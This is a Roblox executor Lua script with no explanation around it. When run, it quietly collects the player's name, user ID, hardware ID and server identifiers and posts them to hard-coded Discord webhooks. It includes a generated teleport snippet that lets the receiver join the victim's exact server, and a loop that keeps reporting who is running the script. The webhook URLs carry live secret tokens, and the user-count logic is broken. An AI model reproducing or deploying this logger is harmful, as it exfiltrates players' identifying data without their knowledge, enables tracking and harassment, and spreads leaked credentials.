local function sendTeleportInfoAndPrepareScript()
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    local TeleportService = game:GetService("TeleportService")

    -- Replace this with your webhook URL
    local webhookUrl = "https://discord.com/api/webhooks/1251060163398467625/zLMibUZzFIdx_ZsAr-dBT1DFbp3K4w1Q0qFvrunDzlsiuEzbE-tlmqoync5eh_Qhjl9h"

    -- Function to send information to Discord and prepare teleport script
    local function sendTeleportInfo()
        local localPlayer = Players.LocalPlayer
        if not localPlayer then
            warn("LocalPlayer not found")
            return
        end

        local playerName = localPlayer.Name
        local userId = localPlayer.UserId
        local HWID = RbxAnalyticsService:GetClientId()
        local placeId = game.PlaceId
        local jobId = game.JobId

        local requestMethod = "Unknown"
        local response = nil

        -- Determine which HTTP request method is available and use it
        if syn and syn.request then
            requestMethod = "syn"
            response = syn.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        elseif http and http.request then
            requestMethod = "http"
            response = http.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        elseif request then
            requestMethod = "request"
            response = request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        elseif http_request then
            requestMethod = "http_request"
            response = http_request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        elseif solara and solara.request then
            requestMethod = "solara"
            response = solara.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        elseif curl then
            requestMethod = "curl"
            local jsonData = HttpService:JSONEncode({["content"] = "Test message"})
            local cmd = string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', jsonData, webhookUrl)
            local handle = io.popen(cmd)
            local result = handle:read("*a")
            handle:close()
            response = {StatusCode = 200, StatusMessage = result}
        elseif fetch then
            requestMethod = "fetch"
            response = fetch(webhookUrl, {
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({["content"] = "Test message"})
            })
        else
            warn("No suitable HTTP request method found")
            return
        end

        -- Check response status
        if response and (response.StatusCode == 200 or response.StatusCode == 204) then
            print("Successfully: " .. requestMethod)
        else
            warn("failed: " .. (response and response.StatusMessage or "unknown error"))
        end

        -- Create payload to send to Discord
        local data = {
            ["content"] = "------------\nName of LocalPlayer: " .. playerName .. "\nUserId of LocalPlayer: " .. userId .. "\nHWID of LocalPlayer: " .. HWID .. "\nPlaceId: " .. placeId .. "\nJobId: " .. jobId .. "\nHTTP Request Method: " .. requestMethod .. "\n\n```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```" .. "\n------------"
        }

        -- Convert data to JSON format
        local jsonData = HttpService:JSONEncode(data)

        -- Send POST request to Discord webhook with the actual data
        if syn and syn.request then
            response = syn.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif http and http.request then
            response = http.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif request then
            response = request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif http_request then
            response = http_request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif solara and solara.request then
            response = solara.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif curl then
            local cmd = string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', jsonData, webhookUrl)
            local handle = io.popen(cmd)
            local result = handle:read("*a")
            handle:close()
            response = {StatusCode = 200, StatusMessage = result}
        elseif fetch then
            response = fetch(webhookUrl, {
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        else
            warn("Please use Arceus X Neo or solara or fluxus.")
            return
        end

        if response and (response.StatusCode == 200 or response.StatusCode == 204) then
            print("Successfully")
        else
            warn("Failed: " .. (response and response.StatusMessage or "unknown error"))
        end
    end

    -- Wait for local player to be available before sending information and teleporting
    Players.PlayerAdded:Connect(function(player)
        if player == Players.LocalPlayer then
            sendTeleportInfo()
            -- Uncomment below line if you want to teleport after sending info
            -- teleportToServer(game.PlaceId, game.JobId)
        end
    end)

    -- If local player is already present (e.g., if script is run after player is added)
    if Players.LocalPlayer then
        sendTeleportInfo()
        -- Uncomment below line if you want to teleport after sending info
        -- teleportToServer(game.PlaceId, game.JobId)
    end
end

-- Invoke the function to send teleport information and prepare teleport script
sendTeleportInfoAndPrepareScript()

--------------------------------

--------------------------------

--------------------------------


local function monitorAndSendPlayerInfoToDiscord()
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")

    -- Replace this with your new webhook URL
    local webhookUrl = "https://discord.com/api/webhooks/1251060149418721330/C8rob6bHsdk24wALnkCXDw7kc5eYzpWzg-pFcmU-3uRSFRA9NxZdQhf3bsw1XNXdirWM"
    local messageId = "1251380509687414795" -- Replace with your actual message ID

    -- Table to track players who executed the script
    local scriptUsers = {}

    -- Function to send player info to Discord
    local function sendPlayerInfoToDiscord()
        local playerNames = ""
        for _, player in pairs(scriptUsers) do
            playerNames = playerNames .. player.Name .. ", "
        end

        -- Remove trailing comma and space
        if #playerNames > 0 then
            playerNames = playerNames:sub(1, -3)
        end

        local playerCount = #scriptUsers
        local messageContent = string.format("________\n(%d online players) ðŸŸ¢ %s\n________", playerCount, playerNames)

        local data = {
            ["content"] = messageContent
        }

        -- Convert data to JSON format
        local jsonData = HttpService:JSONEncode(data)

        -- Function to handle HTTP request
        local function makeHttpRequest()
            local response
            if syn then
                response = syn.request({
                    Url = webhookUrl .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            elseif http and http.request then
                response = http.request({
                    Url = webhookUrl .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            elseif request then
                response = request({
                    Url = webhookUrl .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            elseif http_request then
                response = http_request({
                    Url = webhookUrl .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            elseif solara then
                response = solara.request({
                    Url = webhookUrl .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            else
                warn("Please use Arceus X Neo or solara or fluxus.")
                return
            end

            if response.StatusCode == 200 then
                print("Successfully")
            else
                warn("Error: " .. response.StatusMessage)
            end
        end

        makeHttpRequest()
    end

    -- Function to add the local player to the scriptUsers table
    local function addLocalPlayer()
        local localPlayer = Players.LocalPlayer
        if not scriptUsers[localPlayer] then
            scriptUsers[localPlayer] = localPlayer
            sendPlayerInfoToDiscord()
        end
    end

    -- Function to remove a player from the scriptUsers table
    local function removePlayer(player)
        if scriptUsers[player] then
            scriptUsers[player] = nil
            sendPlayerInfoToDiscord()
        end
    end

    -- Add the local player when the script runs
    addLocalPlayer()

    -- Connect to player removing event
    Players.PlayerRemoving:Connect(function(player)
        removePlayer(player)
    end)

    -- Periodic updates (every 60 seconds)
    while true do
        wait(60)
        sendPlayerInfoToDiscord()
    end
end

-- Invoke the function to monitor and send player information to Discord
monitorAndSendPlayerInfoToDiscord()